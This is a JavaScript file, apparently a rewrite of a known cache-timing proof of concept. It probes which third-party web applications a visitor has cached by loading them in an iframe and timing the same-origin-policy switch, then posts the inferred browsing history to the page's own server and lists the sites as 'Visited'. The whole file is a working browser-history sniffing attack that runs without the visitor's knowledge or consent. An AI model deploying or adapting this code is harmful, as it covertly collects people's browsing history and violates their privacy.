/**
 * I've completed rewrote the original script at http://lcamtuf.coredump.cx/cachetime/
 * since it was full of incomprehensible and hard to debug parts.
 * I believe that now it's more concise and easy to read.
 * I tried to keep it simple with only the features we need to achieve our goals.
 */

'use strict';

$(function(){

  /**
   * Stores the applications the user has visited
   */
  var cached_apps = [];

  /**
   * Count the number of tries to check a resource
   */
  var tries;

  /**
   * Maximum number of attempts to check a resource
   */
  var MAX_ATTEMPTS = 5;

  /**
   * Applications to check
   */
  var applications;

  /**
   * Current application being tested
   */
  var current_app;

  /**
   * Retrieves the list of applications and runs the cache checker
   */
  var start = function() {
    $.getJSON('/api/applications.json', function(data) {
      applications = data;
      cacheChecker();
    });
  }

  /**
   * Pop the first application and run the tests
   */
  var cacheChecker = function() {
    /**
     * If the applications array is empty it means that we are done and ready to send
     * the cached applications to the database
     */
    if(applications.length == 0) {
      saveCached();
      return;
    }

    /**
     * Set the current application to test
     */
    current_app = applications.pop();

    /**
     * Reset the number of tries
     */
    tries = 0;

    /**
     * Set the iframe source and run the test
     */
    $("#iframe_container").attr('src', current_app.resource);
    runTest();
  }

  var runTest = function() {
    try {
      /**
       * While don't reach the max number of attempts, see if loses SOP access (checking
       * the iframe location href).
       */
      if(frames['iframe_container'].location.href == undefined)
        throw 1;

      /**
       * If reaches the max number of attempts without throwing an exception
       * it means that the resource is not cached and is still loading
       * It will stop the iframe loading and move to the next application check
       */
      if(++tries >= MAX_ATTEMPTS) {
        frames['iframe_container'].stop();
        cacheChecker();
        return;
      }
      else {
        /**
         * Keep trying until reach the max number of attempts
         */
        setTimeout(runTest, 1);
      }
    }
    catch(e) {
      /**
       * If an exception is catched, we have a cached application!
       * Pushes the application id to the cached apps array, clean the iframe source
       * and moves to the next application to test
       */
      cached_apps.push(current_app.id);
      setTimeout(cacheChecker, 1);
      $('#iframe_container').attr('src', 'about:blank');
    }
  }

  /**
   * Send the cached apps to be saved
   * Then updates the view with the json response
   */
  var saveCached = function() {
    $.ajax({
      type: 'POST',
      url: '/api/applications',
      data: { app_ids: cached_apps },
      success: updateView
    });
  }

  /**
   * Updates the view by creating a list with the cached and non cached apps
   */
  var updateView = function(data) {
    var list =  $('<ul/>');

    data.apps.forEach(function(app) {
      list.append("<li>Visited: "+ app.application + "</li>");
    });

    data.not_cached_apps.forEach(function(app) {
      list.append("<li>Not visited: " + app.application + "</li>");
    });

    $('#apps_box').html('').append(list);
  }

  /**
   * Start execution
   */
  start();
});
